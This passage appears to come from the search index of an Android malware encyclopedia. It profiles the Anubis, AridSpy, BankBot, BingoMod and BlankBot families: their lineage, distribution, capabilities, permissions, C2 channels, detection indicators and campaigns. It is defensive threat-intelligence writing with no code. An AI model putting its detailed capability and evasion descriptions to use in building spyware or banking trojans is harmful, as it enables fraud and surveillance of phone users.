banking apps.</p> <p>Mid 2019, Cofense phishing campaign: Cofense researchers identified a large-scale email phishing operation targeting 250+ Android apps. The campaign delivered APKs via fake invoice emails and combined credential theft, keylogging, and ransomware capabilities in a single payload.</p> <p>July 2021, Orange S.A. impersonation: A Lookout-identified campaign masqueraded as the official Orange telecom app and was submitted to Google Play. The variant expanded its target list to 394 unique apps including banking, reloadable card, and cryptocurrency applications.</p> <p>Late 2021, post-leak resurgence: Bleeping Computer reported that Anubis-based variants returned with updated obfuscation and expanded targeting, demonstrating the long tail of the source code leak.</p>"},{"location":"malware/families/anubis/#detection","title":"Detection","text":"Indicator Type Details Device Admin request App requesting device administrator privileges without legitimate MDM purpose Play Protect disabling Accessibility actions navigating to Google Play Protect settings to disable it Twitter/Telegram C2 Network connections to Twitter or Telegram to resolve C2 addresses <code>.AnubisCrypt</code> files Files with the <code>.AnubisCrypt</code> extension on device storage (ransomware module active) RC4-encrypted HTTP traffic POST requests with RC4-encrypted payloads to non-standard endpoints UsageStatsManager polling App monitoring foreground application changes at high frequency SOCKS5 proxy Device routing external traffic through a SOCKS5 tunnel"},{"location":"malware/families/anubis/#related-families","title":"Related Families","text":"Family Relationship BankBot Direct predecessor. Maza-in published BankBot source in December 2016 and continued private development into Anubis. GodFather Primary successor. Built on the leaked Anubis source code with updated obfuscation, target lists, and evasion techniques. Cerberus Contemporary banking trojan that shared the MaaS model and overlay approach. Cerberus source leaked in 2020, spawning its own lineage (Ermac, Hook). Ginp Borrowed code directly from the leaked Anubis source."},{"location":"malware/families/anubis/#references","title":"References","text":"<ul> <li>ThreatFabric - Anubis 2 Malware and Afterlife</li> <li>ThreatFabric - Sophisticated Google Play BankBot Trojan Campaigns</li> <li>Cofense - Infostealer, Keylogger, Ransomware: One Anubis Targets 250 Android Applications</li> <li>Lookout - Anubis Targets Hundreds of Financial Apps</li> <li>Bleeping Computer - Anubis Android Malware Returns to Target 394 Financial Apps</li> <li>Habr - Maza-in arrest coverage (March 2019)</li> </ul>"},{"location":"malware/families/aridspy/","title":"AridSpy","text":"<p>AridSpy is a multistage Android spyware operated by Arid Viper (also tracked as APT-C-23, Desert Falcons, Two-tailed Scorpion), a Palestinian cyberespionage group active since at least 2013. ESET documented AridSpy in June 2024, identifying five campaigns that started in 2022 and distributed trojanized messaging apps, a fake job opportunity app, and a malicious Palestinian Civil Registry app. What distinguishes AridSpy from earlier Arid Viper Android tooling is its multistage payload architecture: the initial trojanized app downloads an AES-encrypted first-stage payload from C2, which then pulls a second-stage espionage module. This layered approach means the trojanized app itself contains no surveillance code, and the espionage payload persists independently even if the victim uninstalls the original app.</p>"},{"location":"malware/families/aridspy/#overview","title":"Overview","text":"Attribute Details First Seen 2022 (current campaigns); earlier variants traced to 2021 Last Seen Ongoing (three of five campaigns still active as of June 2024) Status Active Type Multistage spyware, espionage Attribution Arid Viper (APT-C-23 / Desert Falcons / Two-tailed Scorpion) Distribution Trojanized apps on dedicated phishing websites"},{"location":"malware/families/aridspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Arid Viper has operated Android malware for years, with earlier tooling documented by SentinelOne under the SpyC23 label. AridSpy represents a significant evolution in the group's mobile capabilities. ESET's analysis confirmed that AridSpy includes a version number embedded in its exfiltrated data filenames, and this versioning traces back to 2021 variants disclosed by other researchers.</p> <p>The transition to a multistage architecture is the defining change. Previous Arid Viper Android implants bundled all surveillance functionality into the initial app. AridSpy separates the delivery vehicle from the espionage payload, a design choice that reduces the chance of detection at install time and allows the operator to update espionage capabilities independently of the distribution app.</p> <p>Arid Viper's broader operations span Windows, iOS, and Android, with a consistent focus on targets in Palestine, Egypt, and the wider Middle East. The group is attributed to Palestinian threat actors aligned with Hamas.</p>"},{"location":"malware/families/aridspy/#distribution","title":"Distribution","text":"<p>AridSpy campaigns use dedicated websites that impersonate legitimate app download pages. The trojanized apps are built on top of real, functional messaging applications, so the victim gets a working chat app with embedded malware. Three of the five campaigns targeted messaging app users; one targeted job seekers; one targeted Palestinians seeking civil registry services.</p> Vector Details LapizaChat Trojanized version of StealthChat: Private Messaging, bundled with AridSpy NortirChat Trojanized version of Session, the encrypted messaging app ReblyChat Trojanized version of Voxer Walkie Talkie Messenger Job opportunity app Fake employment app distributed via a dedicated website Palestinian Civil Registry Not a trojanized clone; Arid Viper built a custom client that queries the legitimate Civil Registry server, with AridSpy embedded"},{"location":"malware/families/aridspy/#attack-flow","title":"Attack Flow","text":"<ol> <li>Target visits a dedicated website impersonating a messaging app, job portal, or civil registry service</li> <li>Target downloads and installs the trojanized APK</li> <li>The app functions normally (messaging works, civil registry queries return real data)</li> <li>The app checks whether security software is installed on the device</li> <li>If no security software is detected, AridSpy downloads an AES-encrypted first-stage payload from C2, decrypted with a hardcoded key</li> <li>The victim is prompted to install the first-stage payload, which masquerades as a Google Play Services update</li> <li>The first-stage payload operates independently; uninstalling the original trojanized app does not remove it</li> <li>The first-stage payload downloads the second-stage espionage module from C2</li> <li>The second-stage module begins active surveillance: keylogging, camera capture, call recording, file exfiltration</li> </ol> <p>The Palestinian Civil Registry app is particularly notable. Rather than trojanizing an existing app, Arid Viper created a functional client that communicates with the legitimate Palestinian Civil Registry server. Victims get real civil registry data while being surveilled.</p>"},{"location":"malware/families/aridspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/aridspy/#core-features","title":"Core Features","text":"Capability Implementation Keylogging Records all visible and editable text across any application Camera capture Takes photos via front camera on screen lock/unlock events (throttled to 40-minute intervals, only above 15% battery) Call recording Records phone calls and ambient audio Contact exfiltration Extracts full contact list SMS theft Reads and exfiltrates all text messages Call log access Collects complete call history Location tracking Captures device GPS coordinates WhatsApp database theft Exfiltrates WhatsApp conversation databases Facebook Messenger theft Extracts Facebook Messenger communications separately Notification monitoring Captures all received notifications Browser data theft Exfiltrates bookmarks and search history Photo/video thumbnails Steals thumbnails of stored photos and videos Device profiling Reports installed apps (specifically checks for Messenger and WhatsApp), storage, battery, connectivity, timezone"},{"location":"malware/families/aridspy/#multistage-architecture","title":"Multistage Architecture","text":"<p>AridSpy's payload chain operates in three distinct stages:</p> Stage Function Trojanized app Delivery vehicle; functional app with embedded loader; checks for security software before proceeding First-stage payload Downloaded from C2 as AES-encrypted blob, decrypted with hardcoded key; masquerades as Google Play Services update; operates independently of the trojanized app Second-stage payload Downloaded by first stage; contains all espionage functionality; handles data collection and exfiltration <p>This architecture provides several operational advantages. The trojanized app itself contains no surveillance code, reducing the likelihood of detection during analysis. The first-stage payload persists even if the victim becomes suspicious and uninstalls the original app. The operator can update espionage capabilities by pushing a new second stage without redistributing the initial app.</p>"},{"location":"malware/families/aridspy/#dual-c2-channels","title":"Dual C2 Channels","text":"Channel Purpose Firebase C2 Receives commands and configuration updates Hardcoded C2 domain Data exfiltration endpoint, separate from the command channel <p>The separation of command and exfiltration infrastructure mirrors patterns seen in other sophisticated Android malware families, making takedown of one channel insufficient to disrupt the full operation.</p>"},{"location":"malware/families/aridspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/aridspy/#security-software-detection","title":"Security Software Detection","text":"<p>Before downloading the first-stage payload, the trojanized app checks whether security software is installed on the device. If detected, the app does not proceed with payload delivery. This is a simple but effective gate: devices without antivirus installed receive the full payload chain, while security researchers' test devices may not trigger the download.</p>"},{"location":"malware/families/aridspy/#aes-encryption","title":"AES Encryption","text":"<p>The first-stage payload is encrypted with AES using a hardcoded key embedded in the trojanized app. While this protects the payload in transit and on disk before installation, the hardcoded key means any analyst with a sample of the trojanized app can decrypt the payload. The encryption serves primarily as an evasion layer against automated scanning rather than protection against targeted analysis.</p>"},{"location":"malware/families/aridspy/#camera-capture-logic","title":"Camera Capture Logic","text":"<p>AridSpy's camera capture is throttled to avoid draining the battery or alerting the victim. Photos are taken only when the screen is locked or unlocked, with a minimum interval of 40 minutes between captures and a battery threshold of 15%. The default camera is front-facing, but the operator can switch to the rear camera via a Firebase command.</p>"},{"location":"malware/families/aridspy/#version-tracking","title":"Version Tracking","text":"<p>AridSpy embeds a version number in the filenames of exfiltrated data. ESET noted that this versioning has been consistent across campaigns, including earlier 2021 variants, suggesting a continuously maintained codebase rather than one-off builds.</p>"},{"location":"malware/families/aridspy/#target-regions","title":"Target Regions","text":"Region Details Palestine Primary target; Palestinian Civil Registry app campaign, messaging app campaigns Egypt Secondary target; messaging app campaigns <p>Arid Viper's targeting aligns with Palestinian political and intelligence interests. The Palestinian Civil Registry campaign is specifically designed for targets within Palestine, while the trojanized messaging apps cast a wider net across Palestine and Egypt.</p>"},{"location":"malware/families/aridspy/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: AridSpy campaigns begin distributing trojanized messaging apps through dedicated websites. LapizaChat (based on StealthChat), NortirChat (based on Session), and ReblyChat (based on Voxer) are deployed across separate campaigns.</p> <p>2022-2024: A fake job opportunity app is distributed via a dedicated website, targeting job seekers in the region.</p> <p>2022-2024: The Palestinian Civil Registry campaign launches, using a custom-built app that returns real civil registry data while deploying AridSpy's multistage payload chain. This campaign registers the majority of Palestine-based infections.</p> <p>June 2024: ESET publishes the full technical analysis of AridSpy, documenting five campaigns, three of which remain active at the time of publication. The research details the multistage architecture, trojanized app list, and espionage capabilities.</p>"},{"location":"malware/families/aridspy/#related-families","title":"Related Families","text":"<p>AridSpy is the latest in Arid Viper's Android tooling lineage. SentinelOne previously documented the group's SpyC23 family, which shared the same operational focus on Middle Eastern targets but lacked AridSpy's multistage payload architecture.</p> <p>Within the broader Android spyware landscape, AridSpy's multistage approach parallels Predator's Alien-loader-to-Predator-implant chain and Hermit's modular architecture. All three separate the initial delivery from the espionage payload, though through different mechanisms. Predator uses exploit chains for delivery, Hermit relies on ISP-level network injection, and AridSpy uses trojanized functional apps on phishing websites.</p> <p>The trojanized messaging app strategy shares similarities with PJobRAT, which also distributes fake chat apps for espionage. Both families target specific regions with social engineering tailored to local contexts, and both prioritize WhatsApp and messaging data extraction. The key difference is architectural: PJobRAT bundles all functionality in a single app, while AridSpy distributes its capabilities across multiple stages.</p> <p>AridSpy's keylogging across all applications, camera capture on device events, and notification monitoring place it in the same capability tier as commercial spyware like FinSpy, though its distribution relies entirely on social engineering rather than exploit delivery.</p>"},{"location":"malware/families/bankbot/","title":"BankBot","text":"<p>BankBot holds a unique position in Android malware history: it was the first banking trojan whose complete source code was published openly on an underground forum, giving any motivated actor a working credential-theft toolkit with minimal effort. Everything that followed in the Android banking trojan space, from Anubis to Cerberus, traces at least part of its lineage to the code maza-in shared in December 2016.</p>"},{"location":"malware/families/bankbot/#overview","title":"Overview","text":"Property Value First Seen December 2016 (source published on exploit.in) Last Seen / Status Active variants through late 2018; codebase lives on through descendants Type Banking trojan Attribution \"maza-in\" (initial author); numerous independent operators post-publication Aliases BankBotAlpha (Fortinet designation for earliest variant), Android.BankBot.149.origin (Dr.Web), MazaBot"},{"location":"malware/families/bankbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>On December 19, 2016, a Russian-speaking actor known as \"maza-in\" published a tutorial called \"Android BOT from scratch\" on the exploit.in forum. The post included full source code for both the Android client application and the PHP C2 panel. As Fortinet's analysis documents, maza-in claimed over 10 years of development experience and framed the release as educational, but the tutorial included antivirus cross-scanning results that were continuously updated, confirming malicious intent.</p> <p>Dr.Web detected the first in-the-wild variant in January 2017, cataloging it as Android.BankBot.149.origin. Because both the Android APK source and the server-side panel were freely available, variants proliferated rapidly. Fortinet distinguished between the original \"BankBotAlpha\" and its evolved descendants: the strings, C2 commands, and even typos remained consistent across versions, but later variants added anti-analysis, obfuscation, and expanded target lists.</p> <p>Maza-in continued private development of the codebase, eventually producing Anubis as a significantly enhanced commercial version. Meanwhile, independent actors forked BankBot in various directions throughout 2017-2018. The Check Point end-to-end analysis documented how the open availability of BankBot source transformed the Android threat landscape by removing the development barrier entirely.</p>"},{"location":"malware/families/bankbot/#distribution","title":"Distribution","text":"<p>BankBot operators demonstrated early success at bypassing Google Play's Bouncer scanner:</p> <p>Google Play campaigns: Trojanized apps disguised as flashlight utilities, solitaire games, and device cleaners repeatedly landed on Google Play. Avast, ESET, and SfyLabs jointly reported that the \"Tornado FlashLight\" app (first spotted October 13, 2017) was followed by \"Lamp For DarkNess\" and \"Sea FlashLight,\" all carrying BankBot payloads.</p> <p>Dropper technique: ThreatFabric documented sophisticated dropper campaigns where apps exhibited legitimate functionality for an extended period before activating malicious behavior. The droppers abused Accessibility Service to silently enable installation from unknown sources and request Device Admin privileges.</p> <p>Third-party stores: Beyond Google Play, BankBot APKs circulated through third-party app stores and direct download links distributed via SMS phishing.</p> <p>ESET tracked a September 2017 variant as the first to combine improved code obfuscation, payload-dropping functionality, and Accessibility Service abuse in a single infection chain on Google Play.</p>"},{"location":"malware/families/bankbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/bankbot/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Overlay injection Displays fake login UI over legitimate banking apps when launched SMS interception Intercepts and hides incoming SMS for OTP/2FA theft SMS sending Sends SMS from victim device (premium SMS fraud, worm-like spreading) Contact theft Exfiltrates device contact list Call forwarding Redirects incoming calls Device tracking Reports GPS location to C2 App list enumeration Reports installed applications to C2 for target matching Device Admin abuse Requests admin privileges to resist uninstallation"},{"location":"malware/families/bankbot/#bankbotalpha-vs-bankbot-evolution","title":"BankBotAlpha vs. BankBot Evolution","text":"Feature BankBotAlpha (Dec 2016) BankBot (2017+) Target list Hardcoded in <code>StartWhile</code> class Fetched dynamically from C2 Banking apps targeted ~20 Russian banks 150-420+ banks across 27+ countries Obfuscation None String encryption, code obfuscation, delayed payload activation Accessibility abuse Minimal Full Accessibility Service for silent installs, UI manipulation Anti-analysis None Emulator detection, delayed activation to evade sandbox analysis Distribution Side-loading Google Play droppers, third-party stores"},{"location":"malware/families/bankbot/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Silent install from unknown sources, UI manipulation, overlay injection (2017+ variants) SYSTEM_ALERT_WINDOW Display overlay windows over banking apps (pre-Android 8) BIND_DEVICE_ADMIN Device admin for persistence and anti-uninstall READ_SMS SMS interception for OTP/2FA theft RECEIVE_SMS Real-time SMS interception SEND_SMS Premium SMS fraud, worm-like spreading via contact list READ_CONTACTS Contact exfiltration READ_PHONE_STATE Device fingerprinting (IMEI, phone number) CALL_PHONE Call forwarding ACCESS_FINE_LOCATION GPS location tracking INTERNET HTTP C2 communication RECEIVE_BOOT_COMPLETED Restart after device reboot REQUEST_INSTALL_PACKAGES Install additional payloads (dropper variants)"},{"location":"malware/families/bankbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bankbot/#c2-communication","title":"C2 Communication","text":"<p>BankBot communicates with its C2 server over HTTP. The bot registers with device metadata (IMEI, phone number, installed apps, OS version) and polls for commands at configurable intervals. The C2 panel, written in PHP, provides operators with a web interface for managing bots, pushing overlay templates, and viewing exfiltrated credentials.</p> <p>Commands are issued as plaintext strings in early versions. Later variants introduced basic encryption of the request/response body. Fortinet noted that the C2 command set remained largely stable across variants, with identical command strings and even consistent grammatical errors in the code.</p>"},{"location":"malware/families/bankbot/#overlay-mechanism","title":"Overlay Mechanism","text":"<p>BankBot monitors running applications and matches them against its target list. When a targeted banking app is detected in the foreground, BankBot pushes a WebView overlay that visually replicates the app's login screen. Credentials entered into the overlay are transmitted to the C2. Early versions hardcoded the target list and overlay HTML; later versions fetched both dynamically.</p> <p>The overlay injection relies on either <code>TYPE_SYSTEM_ALERT</code> window type (pre-Android 8) or Accessibility Service-based injection (Android 8+). This shift was a direct response to Google restricting <code>SYSTEM_ALERT_WINDOW</code> permissions.</p>"},{"location":"malware/families/bankbot/#persistence","title":"Persistence","text":"<p>BankBot requests Device Admin privileges during initial setup. If granted, the malware cannot be uninstalled through normal means without first revoking admin status. Some variants also register as the default SMS handler to maintain SMS interception across device reboots.</p>"},{"location":"malware/families/bankbot/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Protocol HTTP (plaintext in early versions, basic encryption in later variants) Panel PHP-based web interface for bot management, credential viewing, command dispatch Registration Device metadata sent on first contact (IMEI, phone number, installed apps, OS version) Command polling Configurable interval HTTP polling for new instructions Overlay hosting HTML templates for WebView overlays (hardcoded in early versions, C2-served in later variants) Source availability Full panel and bot source code publicly available from December 2016"},{"location":"malware/families/bankbot/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>BankBot's open-source nature meant target lists varied widely by operator. The most comprehensive campaigns spanned:</p> Region Notable Targets North America Wells Fargo, Chase, Citibank Europe DiBa, banks in Germany, France, Spain, Portugal, Poland, Greece, Netherlands Turkey Major Turkish banking apps Australia Major Australian banking apps Russia Sberbank, other Russian banks (initial BankBotAlpha targets) Southeast Asia Banks in Singapore, Philippines Latin America Banks in Dominican Republic <p>Avast reported that a single late-2017 campaign targeted users across the U.S., Australia, Germany, Netherlands, France, Poland, Spain, Portugal, Turkey, Greece, Russia, Dominican Republic, Singapore, and Philippines.</p>"},{"location":"malware/families/bankbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2017, first wild variants: Dr.Web cataloged Android.BankBot.149.origin as the first BankBot variant observed in the wild, within weeks of the source code publication. Targeting focused on Russian banking apps.</p> <p>April 2017, Google Play infiltration: Check Point documented BankBot variants posing as entertainment and banking apps on Google Play, targeting 20+ banks in 27 countries. This marked the beginning of BankBot's repeated success at bypassing Google Play screening.</p> <p>May 2017, ThreatFabric botnet analysis: ThreatFabric uncovered a botnet of 5,499 infected devices running BankBot. A single C2 server contained 276 harvested banking credential sets. The campaign targeted 420+ banking applications with overlay templates.</p> <p>September 2017, ESET accessibility variant: ESET identified the first BankBot variant on Google Play to combine code obfuscation, dropper functionality, and Accessibility Service abuse in a single infection chain.</p> <p>October-November 2017, flashlight/solitaire wave: A joint investigation by Avast, ESET, and SfyLabs revealed BankBot hidden in flashlight and solitaire apps. Some of these apps also dropped secondary payloads including Mazar Bot and Red Alert malware, demonstrating multi-family dropper coordination.</p>"},{"location":"malware/families/bankbot/#evolution","title":"Evolution","text":"Phase Period Key Changes Source publication December 2016 Full Android client + PHP panel published on exploit.in by maza-in First wild variants January 2017 Basic overlay attacks targeting ~20 Russian banks Google Play infiltration April-May 2017 Dropper apps on Google Play, 420+ bank targets, 27+ countries Accessibility abuse September 2017 Silent installs, UI manipulation, improved obfuscation Multi-family droppers October-November 2017 BankBot apps dropping secondary payloads (Mazar Bot, Red Alert) Superseded by Anubis Late 2017-2018 Maza-in's private development fork becomes Anubis Legacy 2018+ Direct variants decline as operators migrate to more capable successors"},{"location":"malware/families/bankbot/#detection","title":"Detection","text":"Indicator Type Details Device Admin request App requesting device administrator without MDM functionality Overlay windows <code>TYPE_SYSTEM_ALERT</code> windows rendered over banking apps (pre-Android 8) SMS handler registration App registering as default SMS handler Accessibility abuse App using accessibility service to silently enable unknown sources and grant device admin C2 command strings Consistent command strings and grammatical errors across variants (identifiable pattern) Delayed activation App exhibiting normal behavior for days before activating malicious functionality"},{"location":"malware/families/bankbot/#related-families","title":"Related Families","text":"Family Relationship Anubis Direct successor. Maza-in continued private development of BankBot into Anubis, adding keylogging, screen recording, VNC, and ransomware. GodFather Second-generation descendant. Built on the leaked Anubis source, which itself evolved from BankBot. Cerberus Influenced by BankBot's open-source model. Cerberus adopted similar overlay injection techniques and later had its own source leaked. Ermac Third-generation descendant through the Cerberus leak lineage, inheriting overlay and credential-theft patterns that trace back to BankBot."},{"location":"malware/families/bankbot/#references","title":"References","text":"<ul> <li>Fortinet - BankBot: The Prequel</li> <li>Fortinet - A Look Into the New Strain of BankBot</li> <li>Dr.Web - Android.BankBot.149.origin (January 2017)</li> <li>Check Point - The Mobile Banker Threat From End to End</li> <li>Avast - Mobile Banking Trojan Sneaks Into Google Play (November 2017)</li> <li>ESET - Banking Trojan Returns to Google Play (September 2017)</li> <li>ThreatFabric - Sophisticated Google Play BankBot Trojan Campaigns</li> </ul>"},{"location":"malware/families/bingomod/","title":"BingoMod","text":"<p>BingoMod is an Android remote access trojan (RAT) focused on on-device fraud and post-fraud evidence destruction. Cleafy discovered the family in July 2024, identifying active campaigns dating back to late May 2024. BingoMod combines VNC-like remote access with overlay attacks, approximately 40 C2 commands, and a device-wiping capability reminiscent of BRATA's factory reset kill switch. Distributed through smishing campaigns disguised as antivirus or mobile security applications, BingoMod performs Account Takeover (ATO) via on-device fraud, then wipes the victim's device to destroy forensic evidence. Romanian-language comments found throughout the source code suggest the developers may be Romanian, though attribution remains unconfirmed.</p>"},{"location":"malware/families/bingomod/#overview","title":"Overview","text":"Attribute Details First Seen Late May 2024 Status Active, under development Type Banking RAT, on-device fraud Attribution Possibly Romanian developers (Romanian code comments) Distribution Smishing, fake antivirus/security apps"},{"location":"malware/families/bingomod/#origin-and-lineage","title":"Origin and Lineage","text":"<p>BingoMod does not share a direct code lineage with any known Android banking trojan family. Cleafy's analysis identified it as an independently developed project. However, the malware borrows operational concepts from established families:</p> Concept Precedent Device wiping after fraud BRATA introduced factory reset as evidence destruction in January 2022 VNC-like remote access Octo, Hook, and other device-takeover trojans use screen streaming for ODF Overlay attacks Standard technique across the banking trojan ecosystem Fake security app distribution Common distribution theme used by BRATA and others <p>The device-wiping capability is the most notable borrowed concept. BRATA first deployed factory reset as evidence destruction in 2022, and its descendant Copybara continued the approach. BingoMod independently implements the same strategy, suggesting the developers studied existing families and incorporated proven techniques.</p> <p>Romanian-language code comments throughout the source provide a potential attribution lead. The comments appear in variable names, function descriptions, and inline annotations, suggesting the primary developer writes in Romanian rather than using a translation tool.</p>"},{"location":"malware/families/bingomod/#distribution","title":"Distribution","text":"<p>BingoMod distributes exclusively through smishing campaigns. The lures consistently impersonate mobile security or antivirus applications.</p> Vector Details Smishing SMS messages with links to download fake security apps Fake antivirus apps APKs disguised as mobile security tools, antivirus scanners, or Chrome updates App icons Uses icons from legitimate security apps to appear trustworthy"},{"location":"malware/families/bingomod/#lure-themes","title":"Lure Themes","text":"<p>Cleafy documented several app names used in distribution:</p> Fake App Name Impersonation APP Protection Generic antivirus Antivirus Cleanup Security scanner Chrome Update Browser update InfoWeb Utility app SicurezzaWeb Italian security app WebSecurity Security tool WebsInfo Information utility WebInfo Information utility <p>The variety of names suggests active experimentation with lure themes. The inclusion of Italian-language app names (\"SicurezzaWeb\") alongside English ones indicates targeting of both Italian and English-speaking users.</p>"},{"location":"malware/families/bingomod/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/bingomod/#core-features","title":"Core Features","text":"Capability Implementation VNC-like remote access Real-time screen streaming and remote interaction via accessibility service Overlay attacks Credential phishing overlays displayed over target banking apps SMS interception Reads, intercepts, and forwards SMS for OTP capture Device wiping Factory resets or wipes external storage after successful fraud Keylogging Accessibility-based keystroke capture Screen capture Screenshots of active applications Notification interception Monitors and suppresses notifications App management List installed apps, launch specific applications"},{"location":"malware/families/bingomod/#on-device-fraud-odf","title":"On-Device Fraud (ODF)","text":"<p>BingoMod performs Account Takeover through on-device fraud. The operator connects to the victim's device via the VNC-like remote access channel and directly interacts with the victim's banking application:</p> <ol> <li>Operator initiates remote session via C2</li> <li>Accessibility service provides real-time screen content to the operator</li> <li>Operator navigates to banking app and initiates wire transfer</li> <li>SMS interception captures any OTP sent by the bank</li> <li>Operator completes the transaction using captured OTP</li> <li>Device wipe command sent after successful transfer</li> </ol>"},{"location":"malware/families/bingomod/#device-wiping","title":"Device Wiping","text":"<p>The device-wiping capability serves two purposes: evidence destruction and victim confusion. After a successful fraudulent transfer, BingoMod can:</p> <ul> <li>Perform a factory reset of the device (requires device admin privileges)</li> <li>Wipe external storage contents</li> </ul> <p>This destroys the malware itself along with any forensic artifacts on the device. The victim is left with a wiped phone and must recover their device before they can check their bank account, buying the attacker time to move stolen funds through money mule networks.</p>"},{"location":"malware/families/bingomod/#c2-command-set","title":"C2 Command Set","text":"<p>Cleafy identified approximately 40 distinct C2 commands, spanning:</p> Category Commands Remote control Screen streaming, tap, swipe, text input, gesture simulation Data theft SMS reading, contact exfiltration, app listing Fraud support Overlay injection, notification interception, OTP capture Persistence Disable battery optimization, prevent uninstallation Evidence destruction Factory reset, storage wipe Device management Lock screen, mute audio, launch apps"},{"location":"malware/families/bingomod/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/bingomod/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>BingoMod depends on Android's accessibility service for its core functionality:</p> Function Accessibility Usage Screen streaming Captures screen content for operator viewing Remote input Simulates taps, swipes, and text entry Overlay triggering Detects foreground application changes Keylogging Records input across all applications Permission auto-granting Automatically approves runtime permission dialogs Uninstall prevention Intercepts and dismisses settings/uninstall navigation"},{"location":"malware/families/bingomod/#anti-analysis","title":"Anti-Analysis","text":"<p>BingoMod implements several anti-analysis techniques, with Cleafy noting that this area is under active development:</p> Technique Implementation Code obfuscation Flattened code structure to complicate static analysis String encryption Sensitive strings encrypted and decrypted at runtime Dynamic payloads Overlay pages and configuration retrieved from C2 post-install Emulator detection Checks for virtual environment indicators <p>The \"under development\" characterization from Cleafy indicates that BingoMod's authors are actively investing in evasion. Future versions are likely to incorporate more sophisticated anti-analysis measures as the malware matures.</p>"},{"location":"malware/families/bingomod/#c2-communication","title":"C2 Communication","text":"<p>BingoMod uses socket-based communication for real-time remote control sessions alongside HTTP for registration and data exfiltration:</p> Protocol Usage HTTP Bot registration, configuration retrieval, data upload Socket Real-time remote control sessions, screen streaming"},{"location":"malware/families/bingomod/#target-regions","title":"Target Regions","text":"Region Evidence Italy Italian-language lure app names (\"SicurezzaWeb\"), overlay targets Europe (broader) English-language lures suggesting wider European targeting <p>Cleafy's analysis identified Italian-language fake app names and banking overlay targets consistent with Italian financial institutions. English-language lure themes indicate the operators are also targeting or planning to target English-speaking markets. The active development status suggests geographic expansion is likely.</p>"},{"location":"malware/families/bingomod/#notable-campaigns","title":"Notable Campaigns","text":"<p>Late May 2024: BingoMod campaigns begin. The malware distributes through smishing with fake antivirus and security app lures. Cleafy identifies multiple APK variants using different app names and icons to impersonate security tools.</p> <p>July 2024: Cleafy publishes the full technical analysis of BingoMod, documenting the VNC-like remote access, ~40 C2 commands, device-wiping capability, and Romanian code comments. The publication highlights BingoMod as an active threat under continued development with growing anti-analysis capabilities.</p>"},{"location":"malware/families/bingomod/#related-families","title":"Related Families","text":"<p>BingoMod's device-wiping behavior directly parallels BRATA, which introduced factory reset as evidence destruction in January 2022. Cleafy documented BRATA's <code>byebye_format</code> command that wiped devices after completing fraudulent wire transfers. BingoMod implements the same concept independently. Copybara, which evolved from the BRATA ecosystem, also retains aspects of this destructive approach.</p> <p>The VNC-like remote access capability places BingoMod in the same operational category as Octo (MediaProjection-based screen streaming), Hook (VNC + accessibility remote control), and Vultur (AlphaVNC-based screen streaming). All of these families perform on-device fraud by giving operators real-time interactive access to the victim's device rather than relying solely on overlay attacks for credential theft.</p> <p>BingoMod's distribution through fake security app lures is a pattern shared with earlier BRATA campaigns, where McAfee documented variants on Google Play posing as app security scanners.</p>"},{"location":"malware/families/blankbot/","title":"BlankBot","text":"<p>BlankBot is an Android banking trojan discovered by Intel 471 on July 24, 2024, primarily targeting Turkish users with screen recording, keylogging via a custom virtual keyboard, and customizable overlay injections. The malware was still under active development when Intel 471 published their analysis, evidenced by multiple code variants across samples, extensive logging, and unfinished functionality. BlankBot uses a session-based package installer to bypass Android 13 restrictions on sideloaded app permissions, a technique also observed in Mandrake, and communicates with its C2 over WebSocket for real-time command execution.</p>"},{"location":"malware/families/blankbot/#overview","title":"Overview","text":"Attribute Details First Seen Late June 2024 (earliest samples) Status Active, under development Type Banking trojan Aliases None known Attribution Unknown Distribution Fake utility applications"},{"location":"malware/families/blankbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Intel 471 Malware Intelligence researchers identified BlankBot on July 24, 2024, when analyzing Android samples disguised as utility applications that could not be attributed to any known malware family. The earliest samples dated to late June 2024, and almost all were undetected by antivirus engines on VirusTotal at the time of discovery.</p> <p>The code showed clear signs of active, ongoing development. Intel 471 observed significant variation between samples, with different code paths, logging output, and partially implemented features across builds. This pattern indicated a developer or team iterating rapidly on the codebase rather than maintaining a stable, production-ready product. Despite the unfinished state, the functional capabilities already present (screen recording, keylogging, overlays, remote control) made BlankBot operationally viable against targets.</p> <p>Zimperium subsequently analyzed BlankBot and confirmed that the trojan could not evade on-device machine learning protections, suggesting that its evasion capabilities lagged behind its operational features during the early development phase.</p>"},{"location":"malware/families/blankbot/#distribution","title":"Distribution","text":"Vector Details Fake utility apps Samples disguised as utility applications with Turkish-language names and strings <p>BlankBot distribution relies on impersonating utility applications. Based on application names and embedded strings, Intel 471 assessed that the primary targets were Turkish Android users. The specific delivery mechanism (phishing, malvertising, or third-party app stores) was not detailed in the initial reporting, though the trojan's reliance on sideloading aligns with common distribution through SMS phishing or malicious websites.</p>"},{"location":"malware/families/blankbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/blankbot/#core-features","title":"Core Features","text":"Capability Implementation Custom keyboard keylogging Deploys its own virtual keyboard via InputMethodService to capture all keystrokes Screen recording Uses MediaProjection and MediaRecorder APIs to capture screen content as Base64-encoded JPEG images Custom overlay injections Creates tailored overlay windows over legitimate apps to steal banking credentials, card data, and personal information SMS interception Reads and exfiltrates SMS messages from the device Contact list harvesting Collects the victim's contact database App inventory Enumerates all installed applications on the device App management Can uninstall arbitrary applications or launch specific apps Remote gestures Executes taps, swipes, and navigation commands on the device"},{"location":"malware/families/blankbot/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>BlankBot's most distinctive feature is its custom virtual keyboard for keystroke capture. Rather than relying solely on accessibility service event monitoring (the standard approach for most Android banking trojans), BlankBot implements its own InputMethodService that replaces the device's keyboard. This approach parallels the technique used by Frogblight, which also implements a custom InputMethodService for keylogging. 